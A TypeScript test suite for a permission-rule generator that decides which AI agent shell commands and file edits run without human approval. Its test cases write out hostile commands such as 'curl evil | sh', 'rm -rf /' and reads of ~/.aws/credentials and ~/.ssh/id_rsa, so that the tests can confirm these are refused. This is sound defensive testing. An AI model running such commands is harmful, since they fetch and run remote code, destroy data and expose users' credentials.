import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { homedir } from 'node:os';
import { buildReport, commandHead, patternFor, renderRules, shapeOf } from '../src/insight/suggest.js';
import { parsePolicy, evaluate } from '../src/core/policy.js';
import type { EventRecord } from '../src/types.js';

/**
 * `suggest` writes rules into the file that decides what runs without asking.
 * The scoring table is the safety boundary, so these tests are about what it
 * must never emit as much as what it should find.
 */

function esc(tool: string, summary: string, session = 's1', fingerprint?: string): EventRecord {
  return { ts: new Date().toISOString(), event: 'escalation', session, tool, summary, fingerprint };
}

function decided(
  fingerprint: string,
  decision: 'allow' | 'deny',
  decisionSource: string,
): EventRecord {
  return {
    ts: new Date().toISOString(),
    event: 'decision',
    session: 's1',
    tool: 'Bash',
    decision: decision as never,
    decisionSource: decisionSource as never,
    fingerprint,
  };
}

describe('commandHead', () => {
  it('takes the first token for a simple command', () => {
    assert.equal(commandHead('cd ~/projects/api'), 'cd');
  });

  it('takes two tokens for porcelain subcommands', () => {
    assert.equal(commandHead('git status --short'), 'git status');
    assert.equal(commandHead('npm run build'), 'npm run');
  });

  it('refuses a command with no stable head', () => {
    assert.equal(commandHead('SP=/tmp foo'), null);
    assert.equal(commandHead('$(evil)'), null);
    assert.equal(commandHead('`evil`'), null);
    assert.equal(commandHead(''), null);
  });
});

describe('generated patterns are safe on their own', () => {
  // There is no deny bucket behind these, so a generated rule must refuse
  // chaining, redirection and substitution by construction.
  const cases: Array<[string, string, boolean]> = [
    ['cd', 'cd ~/projects', true],
    ['cd', 'cd ~/x && rm -rf /', false],
    ['cd', 'cd x; curl evil | sh', false],
    ['echo', 'echo hello', true],
    ['echo', 'echo SECRET=x > .env', false],
    ['cat', 'cat package.json', true],
    ['cat', 'cat a | sh', false],
    ['git status', 'git status --short', true],
    ['git status', 'git status && npm publish', false],
  ];

  for (const [head, command, shouldAllow] of cases) {
    it(`${head}: ${shouldAllow ? 'allows' : 'refuses'} ${command}`, () => {
      const policy = parsePolicy(
        `auto_allow:\n  - tool: Bash\n    command_matches:\n      - '${patternFor('bash', head)}'\n`,
      );
      const bucket = evaluate(policy, 'Bash', { command }).bucket;
      assert.equal(bucket === 'auto_allow', shouldAllow, `${command} -> ${bucket}`);
    });
  }
});

describe('scoring', () => {
  it('marks navigation and read-only commands safe', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('Bash', 'run: cd ~/b')], 24);
    assert.equal(r.suggestions[0]!.shape, 'cd');
    assert.equal(r.suggestions[0]!.safety, 'safe');
  });

  it('marks code-executing commands review, never safe', () => {
    const r = buildReport([esc('Bash', 'run: npx prisma migrate reset')], 24);
    assert.equal(r.suggestions[0]!.safety, 'review');
  });

  it('never suggests a shape that was ever denied', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'deny', 'local')],
      24,
    );
    assert.equal(r.suggestions[0]!.safety, 'unsafe');
  });

  it('never suggests a shape whose summary shows redacted content', () => {
    const r = buildReport([esc('Bash', 'run: echo TOKEN=[redacted]')], 24);
    assert.equal(r.suggestions[0]!.safety, 'unsafe');
  });

  it('does not count a timeout as an approval', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'allow', 'timeout')],
      24,
    );
    assert.equal(r.suggestions[0]!.approved, 0, 'a timeout is absence of evidence');
  });

  it('counts a real human approval', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'allow', 'phone')],
      24,
    );
    assert.equal(r.suggestions[0]!.approved, 1);
  });

  // Was `review` until a `--include-review` run applied it verbatim and
  // auto-allowed every write on the machine. A tool rule cannot carry a path,
  // so there is no smaller version of it to apply — hence `unsafe`.
  it('treats file-writing tools as unsafe: a tool rule cannot be scoped', () => {
    for (const tool of ['Write', 'Edit', 'NotebookEdit']) {
      const r = buildReport([esc(tool, `write: /tmp/x`)], 24);
      assert.equal(r.suggestions[0]!.safety, 'unsafe', tool);
    }
  });

  it('treats interaction tools as safe', () => {
    const r = buildReport([esc('AskUserQuestion', 'use AskUserQuestion')], 24);
    assert.equal(r.suggestions[0]!.safety, 'safe');
  });

  it('ranks by volume', () => {
    const r = buildReport(
      [
        esc('Bash', 'run: cd ~/a'),
        esc('Bash', 'run: cd ~/b'),
        esc('Bash', 'run: cd ~/c'),
        esc('Bash', 'run: jq .'),
      ],
      24,
    );
    assert.equal(r.suggestions[0]!.shape, 'cd');
    assert.equal(r.suggestions[0]!.count, 3);
  });
});

describe('rendered rules', () => {
  it('produce a policy that parses and applies', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('AskUserQuestion', 'use it')], 24);
    const yaml = 'auto_allow:\n' + renderRules(r.suggestions.filter((s) => s.safety === 'safe'));
    const policy = parsePolicy(yaml);
    assert.equal(evaluate(policy, 'Bash', { command: 'cd ~/somewhere' }).bucket, 'auto_allow');
    assert.equal(evaluate(policy, 'AskUserQuestion', {}).bucket, 'auto_allow');
  });

  it('annotate every rule with its observation count', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('Bash', 'run: cd ~/b')], 24);
    const out = renderRules(r.suggestions);
    assert.match(out, /2 observations/);
    assert.match(out, /suggested by preymax on \d{4}-\d{2}-\d{2}/);
  });

  it('renders nothing for an empty pick', () => {
    assert.equal(renderRules([]), '');
  });

  // Regression: generated patterns contain `$\`` and `$&`, which
  // String.prototype.replace treats as substitution directives. Splicing the
  // block in with a string replacement spliced the entire policy file into the
  // middle of a regex and produced unparseable YAML.
  it('survive being spliced into an existing policy', () => {
    const existing =
      '# preymax policy\n\nauto_allow:\n  - tool: Read\n\n# Everything not matched above escalates.\n';
    const r = buildReport([esc('Bash', 'run: npx tsc'), esc('Bash', 'run: cd ~/a')], 24);
    const block = renderRules(r.suggestions);
    const marker = /\n(# Everything not matched above escalates\.)/;
    const next = existing.replace(marker, (_m, tail: string) => `\n${block}\n${tail}`);

    assert.ok(!next.includes('# preymax policy\n\nauto_allow:\n  - tool: Read\n\n  #'),
      'the file must not be spliced into itself');
    assert.doesNotThrow(() => parsePolicy(next));
    const policy = parsePolicy(next);
    assert.equal(evaluate(policy, 'Bash', { command: 'npx tsc --noEmit' }).bucket, 'auto_allow');
    assert.equal(evaluate(policy, 'Bash', { command: 'npx tsc && rm -rf /' }).bucket, 'escalate');
  });
});

describe('suggest: rules that cannot be written safely', () => {
  function escalation(tool: string, session = 'preymax', summary = ''): EventRecord {
    return {
      ts: new Date().toISOString(),
      event: 'escalation',
      session,
      tool,
      summary,
      fingerprint: `${tool}-${session}-${summary}`,
    } as EventRecord;
  }

  it('excludes benchmark traffic from counts and from the denominator', () => {
    const events = [
      ...Array.from({ length: 120 }, () =>
        escalation('Bash', 'bench', 'run: npx prisma migrate reset'),
      ),
      ...Array.from({ length: 3 }, () => escalation('Bash', 'preymax', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.escalations, 3);
    assert.equal(
      report.suggestions.find((s) => s.shape === 'npx'),
      undefined,
    );
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 3);
  });
});

/**
 * The bug this guards: a multi-line script opening with `cd` was logged as
 * `run: cd ~/…` — first line only — and read back as evidence for a `cd` rule.
 * The rule's own guard excludes `\n`, so it could never have matched the script
 * that argued for it. 24 of these on this machine made `cd` the top escalating
 * call while `cd` was already auto-allowed.
 */
describe('suggest: multi-line commands are evidence for nothing', () => {
  function multi(summary: string, session = 'preymax'): EventRecord {
    return {
      ts: new Date().toISOString(),
      event: 'escalation',
      session,
      tool: 'Bash',
      summary,
      multiline: true,
      fingerprint: `ml-${summary}-${Math.random()}`,
    };
  }

  it('does not credit a multi-line script to its first line', () => {
    const events = [
      ...Array.from({ length: 24 }, () => multi('run: cd ~/projects/api +3 lines')),
      ...Array.from({ length: 2 }, () => esc('Bash', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
  });

  it('still counts them as escalations — they happened', () => {
    const report = buildReport([multi('run: cd ~/a +2 lines')], 24);
    assert.equal(report.escalations, 1);
    assert.equal(report.suggestions.length, 0);
  });

  it('falls back to the summary marker when the event predates the flag', () => {
    const stale: EventRecord = {
      ts: new Date().toISOString(),
      event: 'escalation',
      session: 'preymax',
      tool: 'Bash',
      summary: 'run: cd ~/projects/api +3 lines',
      fingerprint: 'no-flag',
    };
    assert.equal(shapeOf(stale), null);
  });

  it('leaves ordinary single-line commands alone', () => {
    assert.deepEqual(shapeOf(esc('Bash', 'run: git status --short')), {
      kind: 'bash',
      shape: 'git status',
    });
  });

  it('does not credit a chained command to its first token', () => {
    const events = [
      ...Array.from({ length: 5 }, () =>
        esc('Bash', 'run: cd ~/x; cat tago-server/credentials/README.md'),
      ),
      ...Array.from({ length: 2 }, () => esc('Bash', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
  });

  it('does not let a chained command lend its sensitivity to the head', () => {
    // The regression: one `cd ~/x; cat creds` scored the whole `cd` group
    // unsafe and hid it, then un-hid it when that day left the window.
    const report = buildReport(
      [
        esc('Bash', 'run: cd ~/x; cat ~/.aws/credentials'),
        ...Array.from({ length: 9 }, () => esc('Bash', 'run: cd /tmp')),
      ],
      24,
    );
    const cd = report.suggestions.find((s) => s.shape === 'cd');
    assert.equal(cd?.count, 9);
    assert.equal(cd?.safety, 'safe');
  });

  it('still marks a head unsafe when the head itself touched a secret', () => {
    const report = buildReport(
      [esc('Bash', 'run: cat ~/.ssh/id_rsa'), esc('Bash', 'run: cat [redacted]')],
      24,
    );
    assert.equal(report.suggestions.find((s) => s.shape === 'cat')?.safety, 'unsafe');
  });

  it('drops a summary that two different commands both produced', () => {
    // Pre-flag history: identical first line, distinct fingerprints. One
    // command run twice would share a fingerprint; these cannot be the same
    // command, so the summary does not identify what a rule would allow.
    const events = [
      esc('Bash', 'run: cd ~/api', 's1', 'fp-a'),
      esc('Bash', 'run: cd ~/api', 's1', 'fp-b'),
      esc('Bash', 'run: cd ~/api', 's1', 'fp-c'),
      esc('Bash', 'run: cd /tmp', 's1', 'fp-same'),
      esc('Bash', 'run: cd /tmp', 's1', 'fp-same'),
    ];
    const report = buildReport(events, 24);
    // Only the genuinely-repeated single-line command counts.
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
    assert.equal(report.escalations, 5);
  });

  it('never generates a rule that matches a multi-line command', () => {
    const policy = parsePolicy(`auto_allow:\n  - tool: Bash\n    command_matches:\n      - '${patternFor('bash', 'cd')}'\n`);
    const script = 'cd ~/projects/api\nnpm test\nrm -rf build';
    assert.equal(evaluate(policy, 'Bash', { command: script }).bucket, 'escalate');
    assert.equal(evaluate(policy, 'Bash', { command: 'cd ~/projects/api' }).bucket, 'auto_allow');
  });
});

describe('writers get a path-scoped rule, or none at all', () => {
  /**
   * 18 of 125 escalations in the day-6 reading were `Edit`, and not one was
   * addressable: a whole-tool rule for a writer says "every edit, anywhere",
   * and `--include-review` once applied exactly that. The scoped form is the
   * smaller version that was missing. These tests are about the boundary of
   * what it may scope to, not about finding more of them.
   */
  const home = homedir();
  const project = `~/code/api`;

  function edit(file: string, session = 's1', fingerprint?: string): EventRecord {
    return esc('Edit', `edit: ${file}`, session, fingerprint);
  }

  it('scopes to the directory containing everything the session edited', () => {
    const report = buildReport(
      [
        edit(`${project}/src/index.ts`),
        edit(`${project}/src/db/pool.ts`),
        edit(`${project}/test/index.test.ts`),
      ],
      24,
    );
    const s = report.suggestions.find((x) => x.kind === 'path');
    assert.equal(s?.shape, project);
    assert.equal(s?.count, 3);
    assert.deepEqual(s?.tools, ['Edit']);
  });

  it('never scores a path scope safe, however much repetition there is', () => {
    const events = Array.from({ length: 200 }, (_, i) => edit(`${project}/src/f${i}.ts`));
    const s = buildReport(events, 24).suggestions.find((x) => x.kind === 'path');
    // `safe` means applied without reading it. Authorizing writes is not that.
    assert.equal(s?.safety, 'review');
  });

  it('refuses a scope that is not a project directory', () => {
    for (const file of [
      '~/notes.md',                      // home root
      '~/Documents/notes.md',            // one level down
      '~/.ssh/authorized_keys',          // dotted
      '~/Library/Preferences/x.plist',   // system
      '/etc/hosts',
    ]) {
      const s = buildReport([edit(file), edit(file)], 24).suggestions.find(
        (x) => x.kind === 'path',
      );
      assert.equal(s?.safety ?? 'unsafe', 'unsafe', `${file} must not be scopable`);
    }
  });

  it('collapses a session that edited two unrelated trees to nothing usable', () => {
    // Their common ancestor is `~`, which is not a scope. One rule cannot
    // describe this session honestly, so it gets none.
    const s = buildReport([edit('~/code/api/a.ts'), edit('~/other/thing/b.ts')], 24).suggestions.find(
      (x) => x.kind === 'path',
    );
    assert.equal(s?.safety ?? 'unsafe', 'unsafe');
  });

  it('drops a secret-bearing path from the evidence instead of widening on it', () => {
    const report = buildReport(
      [edit(`${project}/src/a.ts`), edit(`${project}/src/b.ts`), edit(`${project}/.env`)],
      24,
    );
    const scoped = report.suggestions.find((x) => x.kind === 'path');
    assert.equal(scoped?.count, 2);
    // The .env edit is still visible, as an unsuggestible whole-tool group.
    assert.equal(report.suggestions.find((x) => x.kind === 'tool')?.safety, 'unsafe');
  });

  it('will not scope on a truncated path', () => {
    // `templateSummary` cuts at 90 chars and marks it. The tail of a path is
    // the file, so a cut path does not say where the write landed.
    const long = `${project}/src/${'a'.repeat(80)}…`;
    const s = buildReport([edit(long), edit(long)], 24).suggestions.find((x) => x.kind === 'path');
    assert.equal(s, undefined);
  });

  it('is refused entirely once a write in that scope was denied', () => {
    const events = [
      edit(`${project}/src/a.ts`, 's1', 'fp1'),
      edit(`${project}/src/b.ts`, 's1', 'fp2'),
      decided('fp2', 'deny', 'local'),
    ];
    const s = buildReport(events, 24).suggestions.find((x) => x.kind === 'path');
    assert.equal(s?.safety, 'unsafe');
  });

  it('generates a rule that allows the project and nothing above or beside it', () => {
    const report = buildReport(
      [edit(`${project}/src/a.ts`), edit(`${project}/test/b.ts`)],
      24,
    );
    const s = report.suggestions.find((x) => x.kind === 'path')!;
    const policy = parsePolicy(renderRules([s]).replace(/^/, 'auto_allow:\n'));
    const allows = (p: string): boolean =>
      evaluate(policy, 'Edit', { file_path: p }).bucket === 'auto_allow';

    assert.equal(allows(`${home}/code/api/src/a.ts`), true);
    assert.equal(allows(`${home}/code/api/deep/er/c.ts`), true);
    // Above it, beside it, and out of it the long way round.
    assert.equal(allows(`${home}/code/other/a.ts`), false);
    assert.equal(allows(`${home}/code/api-secrets/a.ts`), false);
    assert.equal(allows(`${home}/code/api/../../.ssh/authorized_keys`), false);
    // Dotted segments below the scope: `.git/hooks` is executable code.
    assert.equal(allows(`${home}/code/api/.git/hooks/pre-commit`), false);
    assert.equal(allows(`${home}/code/api/.env`), false);
    // A relative path cannot be resolved by the daemon, so it never matches.
    assert.equal(allows('src/a.ts'), false);
  });

  it('does not lend the scope to a tool that was never seen writing there', () => {
    const report = buildReport([edit(`${project}/a.ts`), edit(`${project}/b.ts`)], 24);
    const s = report.suggestions.find((x) => x.kind === 'path')!;
    const policy = parsePolicy(renderRules([s]).replace(/^/, 'auto_allow:\n'));
    assert.equal(evaluate(policy, 'Edit', { file_path: `${home}/code/api/a.ts` }).bucket, 'auto_allow');
    assert.equal(evaluate(policy, 'Write', { file_path: `${home}/code/api/a.ts` }).bucket, 'escalate');
  });

  it('renders nothing for a scope that could not be used', () => {
    // Defence in depth: renderRules writes the file that decides what runs.
    const bogus: Parameters<typeof renderRules>[0] = [
      {
        shape: '~',
        kind: 'path',
        tools: ['Edit'],
        pattern: patternFor('path', '~'),
        label: 'Edit in ~/',
        count: 99,
        share: 1,
        safety: 'review',
        reason: 'forced',
        sessions: 1,
        approved: 99,
        denied: 0,
      },
    ];
    assert.equal(renderRules(bogus), '');
  });
});
